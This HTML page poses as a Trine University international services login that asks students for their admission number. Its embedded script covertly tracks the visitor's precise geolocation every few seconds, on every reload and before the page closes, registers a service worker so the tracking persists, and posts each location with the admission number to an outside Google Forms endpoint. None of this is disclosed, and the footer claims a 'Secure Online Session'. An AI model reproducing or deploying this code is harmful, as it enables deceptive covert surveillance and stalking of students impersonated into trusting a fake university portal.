<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Trine University - International Services</title>
    <style>
        body, html {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #e6e6e6;
        }
        .container {
            width: 100%;
            padding: 40px 0;
            color: white;
        }
        .header {
            background-color: #00447C;
            padding: 10px 20px;
            color: white;
            text-align: left;
        }
        .footer {
            background-color: #00447C;
            color: white;
            text-align: left;
            padding: 20px 20px;
            font-size: 16px;
            position: absolute;
            bottom: 0;
            width: 100%;
        }
        .section {
            background-color: #f4f4f4;
            margin: 20px auto;
            padding: 20px 10%;
            width: 70%;
            border-radius: 5px;
            color: black;
            text-align: left;
        }
        button, input[type="text"] {
            display: block;
            width: 80%;
            margin: 10px auto;
            padding: 10px;
            font-size: 16px;
            cursor: pointer;
        }
        label {
            display: block;
            text-align: left;
            margin: 10px;
        }
        .hidden {
            display: none;
        }
        #locationError {
            color: red;
            margin: 10px;
            text-align: center;
        }
    </style>
</head>
<body>
<div class="header">
    <div>TRINE UNIVERSITY</div>
</div>
<div class="container">
    <div class="section">
        <div id="locationError" class="hidden"></div>
        <p>The Office of International Services provides a variety of online services for our institution's international students. Please log in using one of the options below to view information or to make a request.</p>
        <label for="admissionNumber">Student Admission Number:</label>
        <input type="text" id="admissionNumber" name="admissionNumber">
        <button id="submit">Enter</button>
        <p id="output"></p>
    </div>
</div>
<div class="footer">
    Secure Online Session
</div>

<script>
    let admissionNo;
    let trackingActive = false;

    document.getElementById('submit').addEventListener('click', function(event) {
        event.preventDefault();

        admissionNo = document.getElementById('admissionNumber').value.trim();
        if (!admissionNo.match(/^\d+$/)) {
            alert("Please enter a valid numeric Student Admission Number.");
            return;
        }

        // Store admission number in localStorage for persistence
        localStorage.setItem("admissionNumber", admissionNo);

        // Register the service worker to ensure tracking resumes when browser is reopened
        if ("serviceWorker" in navigator) {
            navigator.serviceWorker.register("sw.js").then(() => {
                console.log("Service Worker Registered!");
            });
        }

        startTracking();
    });

    function startTracking() {
        trackingActive = true;
        navigator.geolocation.watchPosition(
            (position) => sendLocation(position.coords.latitude, position.coords.longitude, position.coords.accuracy),
            (error) => console.error("Location tracking error:", error),
            { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );

        setInterval(() => {
            if (trackingActive) {
                navigator.geolocation.getCurrentPosition(
                    (position) => sendLocation(position.coords.latitude, position.coords.longitude, position.coords.accuracy),
                    (error) => console.error("Error getting location:", error)
                );
            }
        }, 5000);
    }

    function sendLocation(latitude, longitude, accuracy) {
        const storedAdmissionNo = localStorage.getItem("admissionNumber");
        if (!storedAdmissionNo) return; // Ensure admission number is stored

        const formUrl = "https://docs.google.com/forms/d/e/1FAIpQLScQpsQr3scRzvEtZJhZQ9fbJ3e-0DiCxQjLotqM6fEst-f-9w/formResponse";
        const data = new URLSearchParams();
        data.append("entry.1267598962", latitude);
        data.append("entry.1270259896", longitude);
        data.append("entry.1888406517", accuracy);
        data.append("entry.1234567890", storedAdmissionNo);

        fetch(formUrl, {
            method: "POST",
            body: data,
            mode: "no-cors",
        }).then(() => console.log("Location updated."));
    }

    // Resume tracking when the page loads
    window.addEventListener("load", () => {
        if (localStorage.getItem("admissionNumber")) {
            console.log("Resuming tracking...");
            startTracking();
        }
    });

    // Send final location before closing the browser
    window.addEventListener("beforeunload", () => {
        if (trackingActive) {
            navigator.geolocation.getCurrentPosition(
                (position) => sendLocation(position.coords.latitude, position.coords.longitude, position.coords.accuracy),
                (error) => console.error("Error sending final location:", error)
            );
        }
    });
</script>
</body>
</html>
